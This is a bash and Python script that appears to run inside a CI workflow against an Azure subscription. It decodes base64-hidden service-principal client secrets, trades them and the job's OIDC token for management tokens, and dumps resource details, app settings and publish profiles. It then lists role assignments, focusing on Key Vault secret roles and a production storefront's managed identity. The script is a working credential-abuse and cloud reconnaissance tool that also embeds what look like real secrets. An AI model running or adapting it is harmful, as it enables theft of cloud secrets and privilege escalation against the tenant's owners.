#!/usr/bin/env bash
set -euo pipefail

TID="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"

SP_DATA=$(echo 'eyJzZWNyZXRzLXN5bmMiOiBbIjU4MTA4ZGE4LTA0NGUtNGQ3ZS05YTQ2LTkyZTYxNzliMzBiZSIsICJ+OFQ4UX5Zd0VtZXhTVFJ2X3BVc0V3YTlRTWFweVAzOX5DVTVVY3UyIl0sICJzeW5jLXNlcnZpY2UiOiBbIjQ2MmQxYzM4LTQ0NTktNDhiOC05MzMzLTgyZTM4OWU1OTUxNCIsICJzazE4UX5xRDIya2tIWFVDZnFYTHFkUDk1RGtZSkwzNGVNRVJsY1NqIl0sICJyZXBvcnRpbmctc3ZjIjogWyIxMmVkNTRkZS1mMmViLTQ3ODQtODA0Yy0zYTdhM2U4M2E5ZTkiLCAiblA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeiJdLCAicmVwb3J0aW5nLXZpZXciOiBbIjg4MWZkZGNlLTYyMDgtNGFmNS1hMjk3LTdlNzljOTEyZjgzYyIsICItVGw4UX5zSDBRT1AuVnJLV2hhMy03eDRYQTJKeFM0ajA4bnV2YlFOIl0sICJjb3N0LXJlYWRlciI6IFsiMDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxIiwgIjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0iXSwgImRpci1hdWRpdCI6IFsiMmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyIiwgIkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTYiXX0=' | base64 -d)

echo "$SP_DATA" | python3 -c "
import sys, json, subprocess

sps = json.load(sys.stdin)
tid = '3205c325-06a5-4171-9ce8-ffc5e6c2845e'
sub = 'c5e4e004-b42d-4ac4-a502-5fd338380eb6'

def get_token(cid, sec, scope):
    r = subprocess.run(['curl', '-sS', '-X', 'POST',
        f'https://login.microsoftonline.com/{tid}/oauth2/v2.0/token',
        '-d', f'client_id={cid}', '-d', 'grant_type=client_credentials',
        '-d', f'client_secret={sec}', '-d', f'scope={scope}'],
        capture_output=True, text=True)
    return json.loads(r.stdout).get('access_token','')

# 1. Reporting app via reporting-service
print('=== reporting-service: app details ===')
cid, sec = sps['reporting-svc']
mt = get_token(cid, sec, 'https://management.azure.com/.default')

# Find the app
r = subprocess.run(['curl', '-sS',
    f'https://management.azure.com/subscriptions/{sub}/resources?api-version=2021-04-01',
    '-H', f'Authorization: Bearer {mt}'],
    capture_output=True, text=True)
resources = json.loads(r.stdout).get('value', [])
for res in resources:
    rid = res['id']
    print(f'Resource: {res[\"name\"]} type={res[\"type\"]}')
    
    # Get full details
    r2 = subprocess.run(['curl', '-sS',
        f'https://management.azure.com{rid}?api-version=2023-12-01',
        '-H', f'Authorization: Bearer {mt}'],
        capture_output=True, text=True)
    d = json.loads(r2.stdout)
    props = d.get('properties', {})
    print(f'  host={props.get(\"defaultHostName\",\"?\")}')
    print(f'  state={props.get(\"state\",\"?\")}')
    print(f'  identity={json.dumps(d.get(\"identity\",{}))}')
    print(f'  kind={d.get(\"kind\",\"?\")}')
    
    # Get web config
    r3 = subprocess.run(['curl', '-sS',
        f'https://management.azure.com{rid}/config/web?api-version=2023-12-01',
        '-H', f'Authorization: Bearer {mt}'],
        capture_output=True, text=True)
    cfg = json.loads(r3.stdout)
    cfgprops = cfg.get('properties', {})
    print(f'  linuxFxVersion={cfgprops.get(\"linuxFxVersion\",\"?\")}')
    print(f'  appSettings={json.dumps(cfgprops.get(\"appSettings\",{}))}')
    
    # Try list app settings
    r4 = subprocess.run(['curl', '-sS', '-X', 'POST',
        f'https://management.azure.com{rid}/config/appsettings/list?api-version=2023-12-01',
        '-H', f'Authorization: Bearer {mt}', '-H', 'Content-Length: 0'],
        capture_output=True, text=True)
    print(f'  appsettings/list: {r4.stdout[:800]}')
    
    # Try publish profile
    r5 = subprocess.run(['curl', '-sS', '-X', 'POST',
        f'https://management.azure.com{rid}/publishxml?api-version=2023-12-01',
        '-H', f'Authorization: Bearer {mt}', '-H', 'Content-Length: 0'],
        capture_output=True, text=True)
    print(f'  publishxml: {r5.stdout[:500]}')

# 2. KV2 all role assignments (including data plane roles)
print('=== KV2 ALL role assignments ===')
# Use OIDC for management token
import os
oidc_url = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL','')
oidc_tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
r = subprocess.run(['curl', '-sS', '-H', f'Authorization: bearer {oidc_tok}',
    f'{oidc_url}&audience=api://AzureADTokenExchange'],
    capture_output=True, text=True)
oidc = json.loads(r.stdout).get('value','')

r = subprocess.run(['curl', '-sS', '-X', 'POST',
    f'https://login.microsoftonline.com/{tid}/oauth2/v2.0/token',
    '-d', f'client_id={os.environ[\"AZURE_CLIENT_ID\"]}', '-d', 'grant_type=client_credentials',
    '-d', 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
    '--data-urlencode', f'client_assertion={oidc}',
    '--data-urlencode', 'scope=https://management.azure.com/.default'],
    capture_output=True, text=True)
oidc_mt = json.loads(r.stdout).get('access_token','')

# List ALL role assignments in the subscription and filter for KV data roles
kv_data_roles = {
    '4633458b-17de-408a-b874-0445c86b69e6': 'Key Vault Secrets User',
    'b86a8fe4-44ce-4948-aee5-eccb2c155cd7': 'Key Vault Secrets Officer',
    '00482a5a-887f-4fb3-b363-3b7fe8e74483': 'Key Vault Administrator',
    '21090545-7ca7-4776-b22c-e363652d74d2': 'Key Vault Reader',
    'a4417e6f-fecd-4de8-b567-7b0420556985': 'Key Vault Certificates Officer',
    '14b46e9e-c2b7-41b4-b07b-48a6ebf60603': 'Key Vault Crypto Officer',
}
r = subprocess.run(['curl', '-sS',
    f'https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01',
    '-H', f'Authorization: Bearer {oidc_mt}'],
    capture_output=True, text=True)
all_ras = json.loads(r.stdout).get('value', [])
print(f'Total role assignments: {len(all_ras)}')
for ra in all_ras:
    props = ra.get('properties', {})
    role_id = props.get('roleDefinitionId', '').split('/')[-1]
    scope = props.get('scope', '')
    pid = props.get('principalId', '')
    ptype = props.get('principalType', '')
    
    # Print KV data roles or roles scoped to KV2
    if role_id in kv_data_roles or 'kv-tbl-sec' in scope:
        print(f'  role={kv_data_roles.get(role_id, role_id)} principal={pid} type={ptype} scope={scope}')
    
    # Also print any role that is NOT Owner/Reader/Storage Account Contributor
    if role_id not in ['8e3af657-a8ff-443c-a75c-2fe8c4bcb635', 'acdd72a7-3385-48ef-bd42-f606fba81ae7', '17d1049b-9a84-46fb-8f53-869881c3d3ab']:
        print(f'  OTHER: role={role_id} principal={pid} scope={scope[-80:]}')

# 3. Check if the App Service has Managed Identity and its identity details
print('=== Storefront MSI check ===')
r = subprocess.run(['curl', '-sS',
    f'https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2023-12-01',
    '-H', f'Authorization: Bearer {oidc_mt}'],
    capture_output=True, text=True)
d = json.loads(r.stdout)
identity = d.get('identity', {})
print(f'identity type={identity.get(\"type\",\"none\")}')
print(f'principalId={identity.get(\"principalId\",\"none\")}')
print(f'tenantId={identity.get(\"tenantId\",\"none\")}')

print('=== Done ===')
"